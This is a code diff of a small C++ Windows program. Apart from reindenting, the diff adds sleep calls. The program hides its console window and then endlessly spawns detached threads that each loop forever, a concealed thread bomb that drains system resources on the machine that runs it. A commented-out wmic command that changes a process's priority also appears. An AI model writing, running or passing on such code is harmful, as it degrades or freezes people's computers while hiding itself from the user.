@@ -12,27 +12,28 @@
 using namespace std;
 inline bool exists(const string name)
 {
-    struct stat buffer;
-    return (stat(name.c_str(), &buffer) == 0);
+	struct stat buffer;
+	return (stat(name.c_str(), &buffer) == 0);
 }
 WINBOOL HideConsole()
 {
-    HWND hwndc = GetConsoleWindow();
-    return ShowWindow(hwndc, SW_HIDE);
+	HWND hwndc = GetConsoleWindow();
+	return ShowWindow(hwndc, SW_HIDE);
 }
 void w()
 {
-    while (1)
-        ;
+	while (1)
+		sleep(50);
 }
 int main()
 {
-    // system("wmic process where \"name='notepad.exe'\" call setpriority 128");
-    HideConsole();
-    while (1)
-    {
-        thread s(w);
-        s.detach();
-    }
-    return 0;
+	// system("wmic process where \"name='notepad.exe'\" call setpriority 128");
+	HideConsole();
+	while (1)
+	{
+		thread s(w);
+		sleep(1);
+		s.detach();
+	}
+	return 0;
 }
